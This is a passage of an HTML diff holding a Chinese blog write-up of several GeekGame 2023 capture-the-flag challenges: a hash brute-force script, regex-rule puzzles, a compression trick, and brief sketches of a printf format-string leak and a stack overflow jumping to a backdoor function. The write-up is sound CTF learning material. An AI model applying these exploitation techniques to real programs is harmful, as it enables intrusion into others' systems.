+<p>第二问卡了很久，改脚本跑只拿到了 hash，没有别的信息（用 Rust 写了个 BFS，差点把我笔记本搞到 OOM）。后来读到 <a href="https://iyn.me/i/post-45.html">https://iyn.me/i/post-45.html</a>，于是用 KirikiriDescrambler 解码了存档，然后又卡了很久，最后发现有个 trail 的变量，标识了每个标签访问了多少次。</p>
+
+<p>有这个信息就简单太多了：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">more_itertools</span> <span class="kn">import</span> <span class="n">distinct_permutations</span> <span class="k">as</span> <span class="n">idp</span>
+
+<span class="k">def</span> <span class="nf">cal_hash</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="mi">1337</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">p</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">:</span>
+            <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">*</span> <span class="mi">13337</span> <span class="o">+</span> <span class="mi">11</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sh">'</span><span class="s">E</span><span class="sh">'</span><span class="p">:</span>
+            <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">*</span> <span class="mi">13337</span> <span class="o">+</span> <span class="mi">22</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">:</span>
+            <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">*</span> <span class="mi">13337</span> <span class="o">+</span> <span class="mi">33</span>
+        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="sh">'</span><span class="s">O</span><span class="sh">'</span><span class="p">:</span>
+            <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">*</span> <span class="mi">13337</span> <span class="o">+</span> <span class="mi">44</span>
+        <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">%</span> <span class="mi">19260817</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">*</span> <span class="mi">13337</span> <span class="o">+</span> <span class="mi">66</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="nb">hash</span> <span class="o">%</span> <span class="mi">19260817</span>
+    <span class="k">return</span> <span class="nb">hash</span>
+
+<span class="k">for</span> <span class="n">cnt</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="nf">idp</span><span class="p">(</span><span class="sh">'</span><span class="s">AAAAAAEEEIOOOOOO</span><span class="sh">'</span><span class="p">)):</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="nf">cal_hash</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="mi">7748521</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Solution:</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">p</span><span class="p">))</span>
+        <span class="c1"># break
+</span></code></pre></div></div>
+
+<p>记得拿原始存档解包！不然 trail 信息是错的，会被坑死。</p>
+
+<p>后面的 binary 和 algorithm 就没有精力去用心做了，毕竟 re 和 pwn 的知识这几年已经全忘了，不怎么用的数学知识大概率也已经还给老师了。</p>
+
+<p class="center"><img src="/pictures/geekgame-2023/drawing3.png" alt="忘记一切" /></p>
+
+<h2 id="初学-c-语言部分">初学 C 语言（部分）</h2>
+
+<p><code class="language-plaintext highlighter-rouge">printf</code> 的第一个参数可以任意控制，所以不停 <code class="language-plaintext highlighter-rouge">%p</code> 让它吐出来就行。</p>
+
+<h2 id="baby-stack部分">Baby Stack（部分）</h2>
+
+<p>无符号 0-1 = UINT_MAX，然后就可以参考最简单的栈溢出 pwn 做了。另外 <code class="language-plaintext highlighter-rouge">coredumpctl gdb</code> 一下可以发现，movaps 不喜欢未对齐的栈，所以得先跳到一个 <code class="language-plaintext highlighter-rouge">ret</code> 然后再跳到 <code class="language-plaintext highlighter-rouge">backdoor</code>。</p>
+
+<h2 id="关键词过滤喵谢谢喵部分">关键词过滤喵，谢谢喵（部分）</h2>
+
+<p>感觉挺有意思的题目，就是如果能发一下测试样例就更好了。</p>
+
+<p>第一问特地提示了十进制，所以解法是：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>把【(?s).】替换成【a】喵
+把【aaaaaaaaaa】替换成【b】喵
+把【bbbbbbbbbb】替换成【c】喵
+把【cccccccccc】替换成【d】喵
+把【dddddddddd】替换成【e】喵
+
+把【ec】替换成【e0c】喵
+把【eb】替换成【e00b】喵
+把【ea】替换成【e000a】喵
+把【e$】替换成【e0000】喵
+把【db】替换成【d0b】喵
+把【da】替换成【d00a】喵
+把【d$】替换成【d000】喵
+把【ca】替换成【c0a】喵
+把【c$】替换成【c00】喵
+把【b$】替换成【b0】喵
+
+把【eeeeeeeee】替换成【9】喵
+把【eeeeeeee】替换成【8】喵
+把【eeeeeee】替换成【7】喵
+把【eeeeee】替换成【6】喵
+把【eeeee】替换成【5】喵
+把【eeee】替换成【4】喵
+把【eee】替换成【3】喵
+把【ee】替换成【2】喵
+把【e】替换成【1】喵
+把【ddddddddd】替换成【9】喵
+把【dddddddd】替换成【8】喵
+把【ddddddd】替换成【7】喵
+把【dddddd】替换成【6】喵
+把【ddddd】替换成【5】喵
+把【dddd】替换成【4】喵
+把【ddd】替换成【3】喵
+把【dd】替换成【2】喵
+把【d】替换成【1】喵
+把【ccccccccc】替换成【9】喵
+把【cccccccc】替换成【8】喵
+把【ccccccc】替换成【7】喵
+把【cccccc】替换成【6】喵
+把【ccccc】替换成【5】喵
+把【cccc】替换成【4】喵
+把【ccc】替换成【3】喵
+把【cc】替换成【2】喵
+把【c】替换成【1】喵
+把【bbbbbbbbb】替换成【9】喵
+把【bbbbbbbb】替换成【8】喵
+把【bbbbbbb】替换成【7】喵
+把【bbbbbb】替换成【6】喵
+把【bbbbb】替换成【5】喵
+把【bbbb】替换成【4】喵
+把【bbb】替换成【3】喵
+把【bb】替换成【2】喵
+把【b】替换成【1】喵
+把【aaaaaaaaa】替换成【9】喵
+把【aaaaaaaa】替换成【8】喵
+把【aaaaaaa】替换成【7】喵
+把【aaaaaa】替换成【6】喵
+把【aaaaa】替换成【5】喵
+把【aaaa】替换成【4】喵
+把【aaa】替换成【3】喵
+把【aa】替换成【2】喵
+把【a】替换成【1】喵
+
+如果看到【[0-9]】就跳转到【结束】喵
+把【^】替换成【0】喵
+
+结束：
+谢谢喵
+</code></pre></div></div>
+
+<p>第二问按照提示的睡排序的思路，但是被 regex catastrophic backtracking 卡住了，之后没细究。</p>
+
+<p>两种尝试：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>重复把【\n\n】替换成【\n】喵
+把【(.+)】替换成【\1😸】喵
+
+如果没看到【😸】就跳转到【结束】喵
+
+排序：
+把【(?m)^(.)(.*)(😸.*)】替换成【\2\3\1】喵
+重复把【(?sm)(^[^😸][^\n]*)(\n.*)(^😸[^\n]*)】替换成【\3\2\1】喵
+
+如果看到【(?m)^[^😸]】就跳转到【排序】喵
+把【😸】替换成【】喵
+
+结束：
+谢谢喵
+</code></pre></div></div>
+
+<p>和</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>重复把【\n\n】替换成【\n】喵
+把【(.+)】替换成【\1✋】喵
+
+如果没看到【✋】就跳转到【结束】喵
+
+排序：
+把【(?m)^(.)(.*)(✋.*)】替换成【\2\3\1】喵
+如果没看到【(?m)^✋】就跳转到【排序】喵
+把【(?m)^✋】替换成【Ⓜ】喵
+重复把【(?sm)(^[^✋✂️Ⓜ][^\n]*)(\n[^Ⓜ]*)(^Ⓜ[^\n]*)】替换成【\3\2\1】喵
+把【(?m)^Ⓜ】替换成【✂️】喵
+
+如果看到【✋】就跳转到【排序】喵
+把【✂️】替换成【】喵
+
+结束：
+谢谢喵
+</code></pre></div></div>
+
+<h2 id="未来磁盘部分">未来磁盘（部分）</h2>
+
+<p>第一问直接解压几次直到发现输出一直是 0，甚至如果你在用 btrfs/zfs，并且开启了透明压缩，即使盘没到 7T 也可以直接解压。</p>
+
+<p>当然最后我还是换了台机器用管道跑，毕竟有点慢：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">gunzip</span> <span class="nt">-c</span> flag1.gz | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\0'</span> <span class="o">&gt;</span> tr.txt
+</code></pre></div></div>
+
+<h2 id="小章鱼的曲奇部分">小章鱼的曲奇（部分）</h2>
+
+<p>第一问 <a href="https://github.com/tna0y/Python-random-module-cracker">https://github.com/tna0y/Python-random-module-cracker</a>，第三问看提示，然后看代码发现 <code class="language-plaintext highlighter-rouge">zip()</code> 只取比较短的那个 list 作为长度，因此只要输入一个值就够了。</p>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h3>Comments</h3>
+<div id="disqus_thread"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css">
+<link rel="stylesheet" href="/assets/dark-disqus.css">
+<script src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js"></script>
+<script>
+// https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/
+function loadDisqus() {
+    var dsqjs = new DisqusJS({
+        shortname: 'taokyblog',
+        siteName: 'taoky\'s blog',
+        // identifier: '',
+        // url: '',
+        // title: '',
+        api: '//blog.taoky.moe/api/',
+        apikey: 'L3W1Q35kDbi2ZGTV2iEfZ8SIksrYf847Ft0ufGon9ye1PTVxG902wO3FtIUq4wgO',
+        nocomment: '无评论.',
+        admin: 'taoky',
+        adminLabel: 'taoky'
+    });
+}
+
+// 通过检查 window 对象确认是否在浏览器中运行
+var runningOnBrowser = typeof window !== "undefined";
+// 通过检查 scroll 事件 API 和 User-Agent 来匹配爬虫
+var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+// 检查当前浏览器是否支持 IntersectionObserver API
+var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+
+// 一个小 hack，将耗时任务包裹在 setTimeout(() => { }, 1) 中，可以推迟到 Event Loop 的任务队列中、等待主调用栈清空后才执行，在绝大部分浏览器中都有效
+// 其实这个 hack 本来是用于优化骨架屏显示的。一些浏览器总是等 JavaScript 执行完了才开始页面渲染，导致骨架屏起不到降低 FCP 的优化效果，所以通过 hack 将耗时函数放到骨架屏渲染完成后再进行。
+setTimeout(function () {
+  if (!isBot && supportsIntersectionObserver) {
+    // 当前环境不是爬虫、并且浏览器兼容 IntersectionObserver API
+    var disqus_observer = new IntersectionObserver(function(entries) {
+      // 当前视窗中已出现 Disqus 评论框所在位置
+      if (entries[0].isIntersecting) {
+        // 加载 Disqus
+        loadDisqus();
+        // 停止当前的 Observer
+        disqus_observer.disconnect();
+      }
+    }, { threshold: [0] });
+    // 设置让 Observer 观察 #disqus_thread 元素
+    disqus_observer.observe(document.getElementById('disqus_thread'));
+  } else {
+    // 当前环境是爬虫、或当前浏览器其不兼容 IntersectionObserver API
+    // 直接加载 Disqus
+    loadDisqus();
+  }
+}, 1);
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+// (function() { // DON'T EDIT BELOW THIS LINE
+// var d = document, s = d.createElement('script');
+// s.src = 'https://taokyblog.disqus.com/embed.js';
+// s.setAttribute('data-timestamp', +new Date());
+// (d.head || d.body).appendChild(s);
+// })();
+</script>
+<noscript>Disqus comment requires JavaScript.</a></noscript>
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+Author: taoky - Subscribe via <a href="https://blog.taoky.moe/feed.xml">RSS</a>
+<br>
+License: <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议（CC-BY-NC-SA 4.0）</a>
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
